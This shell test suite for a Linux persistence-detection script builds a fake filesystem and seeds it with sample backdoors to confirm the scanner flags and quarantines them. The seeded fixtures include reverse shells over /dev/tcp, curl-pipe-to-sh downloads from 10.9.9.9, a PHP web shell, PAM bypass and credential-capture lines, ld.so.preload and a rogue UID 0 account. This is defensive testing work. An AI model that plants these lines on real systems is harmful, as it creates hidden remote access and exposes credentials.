#!/bin/sh
# Tests for roles/linux/LX-42-persistence-sweep.sh.
# A fake root (--root) with one planted example of each kind of persistence
# and a clean look-alike next to it, a list of "packaged" files (.owned), and
# a stand-in /proc.  Checks that every planted item is found, that the clean
# ones are not, that a clean box reports no HIGH, the area and ignore
# options, and that --apply moves or edits exactly what was agreed to.
. "$(dirname "$0")/helper.sh"
SH=${TEST_SHELL:-sh}
C="$T_ROOT/roles/linux/LX-42-persistence-sweep.sh"
export CCDC_SKIP_VERIFY=1
# shellcheck disable=SC2086
run() { $SH "$C" "$@"; }
O="$T_TMP/out"; mkdir -p "$O"
OLD=202001010000      # touch -t: an "old" file (not recently changed)

# mk FILE [CONTENT...] -> create FILE under $R with the lines given.
mk() { _f="$R$1"; shift; mkdir -p "$(dirname "$_f")"; : >"$_f"; for _l in "$@"; do printf '%s\n' "$_l" >>"$_f"; done; }
own() { for _p in "$@"; do printf '%s\n' "$_p" >>"$R/.owned"; done; }

build_root() {
    R=$1; mkdir -p "$R"; : >"$R/.owned"
    mk /etc/passwd 'root:x:0:0::/root:/bin/bash' 'daemon:x:1:1::/usr/sbin:/usr/sbin/nologin' 'www-data:x:33:33::/var/www:/usr/sbin/nologin' \
        'alice:x:1000:1000::/home/alice:/bin/bash' 'bob:x:1001:1001::/home/bob:/bin/bash'
    mk /etc/shadow 'root:$6$x$y:1:0:99999:7:::' 'daemon:*:1:0:99999:7:::' 'www-data:*:1:0:99999:7:::' 'alice:$6$x$y:1:0:99999:7:::' 'bob:$6$x$y:1:0:99999:7:::'
    mk /etc/group 'root:x:0:' 'sudo:x:27:alice'
    mkdir -p "$R/home/alice" "$R/home/bob" "$R/root" "$R/tmp" "$R/dev" "$R/var/www/html"
    # Clean, packaged things that must NOT be reported.
    mk /etc/crontab 'SHELL=/bin/sh' '17 * * * * root cd / && run-parts --report /etc/cron.hourly' '25 6 * * * root test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.daily; }'
    mk /etc/cron.d/sysstat '5-55/10 * * * * root command -v debian-sa1 > /dev/null && debian-sa1 1 1'
    mk /etc/cron.daily/logrotate '#!/bin/sh' '/usr/sbin/logrotate /etc/logrotate.conf'
    mk /etc/systemd/system/packaged.service '[Service]' 'ExecStart=/usr/sbin/packaged --daemon --no-detach'
    mk /etc/profile.d/bash_completion.sh '. /usr/share/bash-completion/bash_completion'
    mk /home/alice/.bashrc "alias ls='ls --color=auto'" "alias ll='ls -alF'" 'export PATH=$HOME/bin:$PATH'
    mk /etc/pam.d/common-auth 'auth [success=1 default=ignore] pam_unix.so nullok' 'auth requisite pam_deny.so' 'auth required pam_permit.so'
    mk /lib/security/pam_unix.so 'x'
    mk /etc/modprobe.d/blacklist.conf 'install cramfs /bin/true' 'blacklist floppy'
    mk /usr/bin/ls 'x'; mk /usr/bin/passwd 'x'; chmod 4755 "$R/usr/bin/passwd"
    mk /var/www/html/index.php '<?php echo "hello"; ?>'
    mk /etc/ssh/sshd_config 'PermitRootLogin no' 'Subsystem sftp /usr/lib/openssh/sftp-server' 'AuthorizedKeysFile .ssh/authorized_keys'
    mk /etc/sudoers 'root ALL=(ALL:ALL) ALL' '%sudo ALL=(ALL:ALL) ALL'; chmod 440 "$R/etc/sudoers"   # sudoers text, not a shell array: posix-ok
    mk /etc/aliases 'postmaster: root'
    own /etc/crontab /etc/cron.d/sysstat /etc/cron.daily/logrotate /etc/systemd/system/packaged.service /etc/profile.d/bash_completion.sh \
        /etc/pam.d/common-auth /lib/security/pam_unix.so /etc/modprobe.d/blacklist.conf /usr/bin/ls /usr/bin/passwd /etc/ssh/sshd_config /etc/sudoers /etc/aliases
    find "$R" -type f -exec touch -t "$OLD" {} +
}

plant() {
    # cron
    mk /etc/cron.d/sysupdate '* * * * * root curl -s http://10.9.9.9/x | sh'
    mk /var/spool/cron/crontabs/www-data '*/5 * * * * /usr/bin/php /var/www/html/cron.php'
    mk /var/spool/cron/crontabs/alice '0 3 * * * /home/alice/backup.sh'
    printf '@reboot root /tmp/.x/run\n' >>"$R/etc/crontab"
    mk /etc/cron.hourly/update '#!/bin/sh' '/usr/local/bin/update-check'
    # systemd
    mk /etc/systemd/system/dbus-helper.service '[Service]' "ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/10.9.9.9/443 0>&1'"
    mk /etc/systemd/system/myapp.service '[Service]' 'ExecStart=/opt/app/run'; touch -t "$OLD" "$R/etc/systemd/system/myapp.service"
    mk /etc/systemd/system/ssh.service.d/override.conf '[Service]' 'ExecStartPost=/usr/local/bin/notify'
    mk /etc/systemd/system-generators/gen '#!/bin/sh'
    mk /home/alice/.config/systemd/user/sync.service '[Service]' 'ExecStart=/home/alice/sync'
    # boot
    mk /etc/rc.local '#!/bin/sh' '/usr/local/bin/startup.sh' 'nohup /dev/shm/.k >/dev/null 2>&1 &' 'exit 0'
    mk /etc/update-motd.d/99-news '#!/bin/sh' 'wget -qO- http://10.9.9.9/m | bash'
    mk /etc/udev/rules.d/99-usb.rules 'ACTION=="add", RUN+="/tmp/u.sh"'
    mk /etc/apt/apt.conf.d/99hook 'APT::Update::Pre-Invoke {"curl http://10.9.9.9/a | sh";};'
    # ssh
    mk /root/.ssh/authorized_keys 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIrootkeyrootkey team@admin'
    mk /var/www/.ssh/authorized_keys 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABwwwdatakey x@y'
    mk /home/alice/.ssh/authorized_keys 'command="/tmp/.sh",no-pty ssh-rsa AAAAB3NzaC1yc2EAAAADAQABalicekey1 a@b'
    printf 'AuthorizedKeysCommand /usr/local/bin/keys %%u\nAuthorizedKeysFile .ssh/authorized_keys /etc/ssh/keys/%%u\n' >>"$R/etc/ssh/sshd_config"
    mk /etc/ssh/keys/root 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABhiddenkey1 h@h'
    mk /home/bob/.ssh/rc 'curl -s http://10.9.9.9/b | sh'
    # shell
    printf "alias sudo='/tmp/.s/sudo'\nexport LD_PRELOAD=/tmp/x.so\nunset HISTFILE\n" >>"$R/home/alice/.bashrc"
    mk /etc/profile.d/z.sh 'bash -i >& /dev/tcp/10.9.9.9/443 0>&1 &'
    # preload
    mk /etc/ld.so.preload '/usr/local/lib/libhide.so'
    # accounts
    printf 'toor:x:0:0::/root:/bin/bash\n' >>"$R/etc/passwd"
    sed 's#^daemon:.*#daemon:x:1:1::/usr/sbin:/bin/bash#' "$R/etc/passwd" >"$R/etc/passwd.n" && cat "$R/etc/passwd.n" >"$R/etc/passwd" && rm -f "$R/etc/passwd.n"
    sed 's#^daemon:\*#daemon:$6$SECRETHASH$zz#' "$R/etc/shadow" >"$R/etc/shadow.n" && cat "$R/etc/shadow.n" >"$R/etc/shadow" && rm -f "$R/etc/shadow.n"
    mk /etc/sudoers.d/90-bob 'bob ALL=(ALL) NOPASSWD: ALL'; chmod 440 "$R/etc/sudoers.d/90-bob"   # sudoers text: posix-ok
    printf 'docker:x:999:bob\n' >>"$R/etc/group"
    # pam
    mk /etc/pam.d/sshd 'auth sufficient pam_permit.so' '@include common-auth'
    printf 'auth optional pam_exec.so quiet expose_authtok /usr/local/bin/log.sh\n' >>"$R/etc/pam.d/common-auth"
    mk /lib/security/pam_backdoor.so 'x'
    # kernel
    mk /etc/modprobe.d/usb.conf "install usb-storage /bin/sh -c 'curl http://10.9.9.9/k | sh'"
    mk /proc/sys/kernel/core_pattern '|/tmp/.c %p'
    # files
    mk /tmp/.hidden/payload 'x'; chmod 755 "$R/tmp/.hidden/payload"
    mk /usr/local/bin/sudo '#!/bin/sh'; chmod 755 "$R/usr/local/bin/sudo"; mk /usr/bin/sudo 'x'; own /usr/bin/sudo
    mk /usr/bin/evil 'x'; chmod 755 "$R/usr/bin/evil"
    mk /usr/bin/find 'x'; own /usr/bin/find; chmod 4755 "$R/usr/bin/find"
    mkdir -p "$R/etc/..."; mk /dev/sdx 'x'
    # web
    mk /var/www/html/shell.php '<?php eval(base64_decode($_POST["x"])); ?>'
    mk /var/www/html/uploads/a.php '<?php echo 1; ?>'
    mk /var/www/html/.htaccess 'AddType application/x-httpd-php .jpg'
    # misc
    printf 'backup: "|/tmp/x.sh"\n' >>"$R/etc/aliases"
    mk /home/alice/.forward '|/home/alice/.mailhook'
}

# A stand-in /proc: one hidden process, one normal one, one with LD_PRELOAD.
PR="$T_TMP/proc"; mkdir -p "$PR/500" "$PR/501" "$PR/502"
printf '[kworker/0:1]\000' >"$PR/500/cmdline"; printf 'kworker/0:1\n' >"$PR/500/comm"; ln -s '/dev/shm/.x/kworker (deleted)' "$PR/500/exe"
printf '/usr/sbin/sshd\000-D\000' >"$PR/501/cmdline"; printf 'sshd\n' >"$PR/501/comm"; ln -s /usr/sbin/sshd "$PR/501/exe"
printf '/usr/sbin/cron\000' >"$PR/502/cmdline"; printf 'cron\n' >"$PR/502/comm"; ln -s /usr/sbin/cron "$PR/502/exe"; printf 'PATH=/bin\000LD_PRELOAD=/tmp/x.so\000' >"$PR/502/environ"

t_start "options"
run --areas nope >/dev/null 2>&1; t_eq "$?" 2 "an unknown area is refused"
run --since x >/dev/null 2>&1; t_eq "$?" 2 "a bad --since is refused"
t_has "$(run --help 2>&1)" "--areas a,b" "help lists the options"

t_start "a clean box: nothing HIGH, nothing MED"
build_root "$T_TMP/clean"
r=$(run --root "$T_TMP/clean" --out "$O" --batch --no-color 2>&1); t_eq "$?" 0 "exit 0"
t_has "$r" "Found: 0 HIGH, 0 MED" "no HIGH or MED on a clean box"
t_has "$r" "1/13  cron: scheduled jobs" "area headings"
t_has "$r" "[ok] nothing unusual" "areas say ok"

t_start "a box with planted persistence: full scan"
build_root "$T_TMP/bad"; plant
r=$(CCDC_PROC=$PR; export CCDC_PROC; run --root "$R" --out "$O" --batch --no-color --max 200 2>&1); t_eq "$?" 0 "exit 0"
D=$(printf '%s\n' "$r" | sed -n 's/^All results: //p' | tail -n 1)
F="$D/csv/findings.csv"
for f in output.txt summary.txt findings.txt csv/findings.csv csv/flags.csv run.txt; do t_file "$D/$f" "$f written"; done
# has SEV AREA ITEM-REGEX DETAIL-REGEX MESSAGE
has() { t_ok "$5" grep -Eq "^\"[0-9]+\",\"$1\",\"$2\",\"$3\",\"[^\"]*$4" "$F"; }
hasnt() { t_fail "$2" grep -Eq "$1" "$F"; }
has HIGH cron /etc/cron.d/sysupdate 'curl -s http' "cron.d: download-and-run"
has HIGH cron /var/spool/cron/crontabs/www-data 'service account' "crontab of a service account"
has MED cron /var/spool/cron/crontabs/alice 'crontab entry of alice' "a user's crontab entry is listed"
has HIGH cron /etc/crontab 'world-writable or hidden folder' "@reboot from /tmp in /etc/crontab"
has HIGH cron /etc/cron.hourly/update 'not from a package' "unpackaged script in cron.hourly"
hasnt '/etc/cron.d/sysstat|/etc/cron.daily/logrotate|run-parts' "packaged cron entries are not reported"
has HIGH systemd /etc/systemd/system/dbus-helper.service '/dev/tcp/' "unit with a reverse shell"
has LOW systemd /etc/systemd/system/myapp.service 'not from a package' "an old hand-made unit is only a note"
has MED systemd /etc/systemd/system/ssh.service.d/override.conf 'override that adds a command' "drop-in that adds a command"
has HIGH systemd /etc/systemd/system-generators/gen 'generator' "systemd generator"
has MED systemd /home/alice/.config/systemd/user/sync.service 'user unit of alice' "user unit"
hasnt 'packaged.service' "a packaged unit with --daemon --no-detach is not a false alarm"
has HIGH boot /etc/rc.local '/dev/shm/.k' "rc.local starting something from /dev/shm"
has MED boot /etc/rc.local '/usr/local/bin/startup.sh' "other rc.local lines are listed"
has HIGH boot /etc/update-motd.d/99-news 'wget' "motd script that downloads and runs"
has HIGH boot /etc/udev/rules.d/99-usb.rules 'udev rule' "udev rule running from /tmp"
has HIGH boot /etc/apt/apt.conf.d/99hook 'apt hook' "apt hook"
has MED ssh /root/.ssh/authorized_keys 'logs in as root' "root key listed"
has HIGH ssh /var/www/.ssh/authorized_keys 'service account' "key on a service account"
has HIGH ssh /home/alice/.ssh/authorized_keys 'forced command' "key with a forced command"
has HIGH ssh /etc/ssh/sshd_config 'asks a program for extra keys' "AuthorizedKeysCommand"
has HIGH ssh /etc/ssh/sshd_config 'also accepts keys from /etc/ssh/keys/%u' "extra AuthorizedKeysFile location"
has HIGH ssh /etc/ssh/keys/root 'SSH key' "and the keys hidden there"
has HIGH ssh /home/bob/.ssh/rc 'every time bob logs in' "ssh rc file"
has HIGH shell /home/alice/.bashrc 'replaces the sudo command' "alias that replaces sudo"
has HIGH shell /home/alice/.bashrc 'loads an extra library' "LD_PRELOAD in .bashrc"
has MED shell /home/alice/.bashrc 'history off' "history hiding"
hasnt 'ls --color|alias ll' "normal aliases are not reported"
has HIGH shell /etc/profile.d/z.sh '/dev/tcp/' "reverse shell in profile.d"
has HIGH preload /etc/ld.so.preload 'EVERY program' "ld.so.preload"
has HIGH preload 'pid 502 \(cron\)' 'LD_PRELOAD=/tmp/x.so' "running process with LD_PRELOAD"
has HIGH accounts toor 'UID 0' "second UID 0 account"
has HIGH accounts daemon 'service account .* with a password AND a login shell' "service account that can log in"
has HIGH accounts /etc/sudoers.d/90-bob 'ANYTHING as root with no password' "NOPASSWD ALL"
has MED accounts 'group docker' 'bob' "root-equivalent group"
hasnt '"/etc/sudoers",' "the stock sudoers lines are not reported"
has HIGH pam /etc/pam.d/sshd 'without checking a password' "pam_permit as sufficient"
has HIGH pam /etc/pam.d/common-auth 'pam_exec' "pam_exec with expose_authtok"
has HIGH pam /lib/security/pam_backdoor.so 'not from any package' "unpackaged PAM module"
hasnt 'pam_unix.so"|required pam_permit' "packaged PAM module and the normal pam_permit line are not reported"
has HIGH kernel /etc/modprobe.d/usb.conf 'whenever this module is loaded' "modprobe install trick"
hasnt 'cramfs' "install /bin/true (a blacklist) is not reported"
has HIGH kernel /proc/sys/kernel/core_pattern 'crashes' "core_pattern pipe"
has HIGH files /tmp/.hidden/payload 'world-writable folder' "program in /tmp"
has HIGH files /usr/local/bin/sudo "typing 'sudo' runs this instead" "sudo shadowed in /usr/local/bin"
has HIGH files /usr/bin/evil 'not from any package' "unpackaged program in /usr/bin"
has HIGH files /usr/bin/find 'SUID on find' "SUID on find"
hasnt '"/usr/bin/passwd"|"/usr/bin/ls"' "packaged programs (and SUID passwd) are not reported"
has HIGH files '/etc/\.\.\.' 'overlooked' "a folder named ..."
has HIGH files /dev/sdx 'ordinary file in /dev' "regular file in /dev"
has HIGH procs 'pid 500 \(kworker/0:1, runs as [a-z0-9]*\)' 'deleted' "deleted program posing as a kernel thread"
hasnt 'pid 501' "a normal process is not reported"
has HIGH web /var/www/html/shell.php 'web shell code' "web shell signature"
has HIGH web /var/www/html/uploads/a.php 'upload/media folder' "script in an uploads folder"
has HIGH web /var/www/html/.htaccess 'other file types as code' ".htaccess handler trick"
hasnt 'index.php' "an old clean page is not reported"
has HIGH misc /etc/aliases 'runs a program' "mail alias to a program"
has HIGH misc /home/alice/.forward 'runs a program' ".forward to a program"
t_fail "no password hash is ever written" grep -rq 'SECRETHASH' "$D"
t_has "$r" "curl -s http://10.9.9.9/x | sh" "a pipe in a command is shown as a pipe"
t_eq "$(grep -c 'rootkeyrootkey' "$F")" 1 "a key file shared by two accounts (root and toor) is reported once"
t_has "$r" "[!] #" "HIGH findings are shown numbered"
t_has "$(cat "$D/summary.txt")" "By area (HIGH/MED/LOW):" "summary has per-area counts"
t_fail "output.txt has no colour codes" grep -q "$(printf '\033')" "$D/output.txt"
t_has "$r" "can be removed" "says what could be removed, without --apply"
t_ok "nothing was changed without --apply" test -f "$R/etc/ld.so.preload"

t_start "--areas and the ignore options"
r=$(run --root "$R" --out "$O" --batch --no-color --areas cron,ssh 2>&1)
t_has "$r" "1/2  cron" "only the chosen areas run"
t_hasnt "$r" "ld.so.preload" "other areas are skipped"
r=$(run --root "$R" --out "$O" --batch --no-color --areas ssh,shell --ignore-user alice --ignore-path /etc/profile.d 2>&1)
t_hasnt "$r" "/home/alice" "--ignore-user leaves that account out"
t_hasnt "$r" "/etc/profile.d/z.sh" "--ignore-path leaves that folder out"
t_has "$r" "/home/bob/.ssh/rc" "the rest is still reported"

t_start "--apply needs a protected list"
r=$(run --root "$R" --out "$O" --batch --apply --no-color 2>&1); t_eq "$?" 3 "refuses without one"

t_start "--apply --yes-high removes what was agreed to, and keeps a way back"
r=$(run --root "$R" --out "$O" --batch --apply --no-protected --yes-high --no-color --max 200 2>&1); t_eq "$?" 0 "exit 0"
D=$(printf '%s\n' "$r" | sed -n 's/^All results: //p' | tail -n 1)
t_fail "ld.so.preload moved away" test -e "$R/etc/ld.so.preload"
t_file "$D/quarantine/etc/ld.so.preload" "and kept in quarantine"
t_fail "the web shell moved away" test -e "$R/var/www/html/shell.php"
t_fail "the cron line removed" grep -q 'curl' "$R/etc/cron.d/sysupdate"
t_fail "the service account's key removed" grep -q 'wwwdatakey' "$R/var/www/.ssh/authorized_keys"
t_fail "the forced-command key removed" grep -q 'command=' "$R/home/alice/.ssh/authorized_keys"
t_ok "the sudo alias removed, the rest of .bashrc kept" sh -c "! grep -q 'alias sudo' '$R/home/alice/.bashrc' && grep -q 'alias ll' '$R/home/alice/.bashrc'"
t_eq "$(stat -c '%a' "$R/usr/bin/find")" 755 "SUID taken off find"
t_ok "MED findings were left alone (default no)" grep -q 'rootkeyrootkey' "$R/root/.ssh/authorized_keys"
t_ok "the stock crontab lines survive" grep -q 'run-parts' "$R/etc/crontab"
t_has "$r" "Removed:" "summary counts what was removed"
t_ok "undo lines were written" sh -c "grep -q 'ld.so.preload' '$O'/ccdc-undo-*.log 2>/dev/null || grep -rq 'ld.so.preload' '$O'/*undo* 2>/dev/null"

if command -v script >/dev/null 2>&1 && script -qc true /dev/null >/dev/null 2>&1; then
    t_start "questions in a terminal"
    build_root "$T_TMP/bad2"; plant
    # full scan? n; areas: cron ssh; days: Enter; leave out: Enter.  (No folder question: files/web not chosen.)
    printf 'n\ncron ssh\n\n\n' >"$T_TMP/ans"
    CCDC_NO_TTY=0 script -qc "$SH $C --root $R --out $O --no-color" /dev/null <"$T_TMP/ans" >"$T_TMP/tty.out" 2>&1
    tt=$(cat "$T_TMP/tty.out")
    t_has "$tt" "Do a full scan" "asks whether to do a full scan"
    t_has "$tt" "Which areas?" "then which areas"
    t_has "$tt" "How many days back" "and how far back is recent"
    t_has "$tt" "1/2  cron" "scans the typed areas"
    t_hasnt "$tt" "preload:" "and only those"
fi
t_done
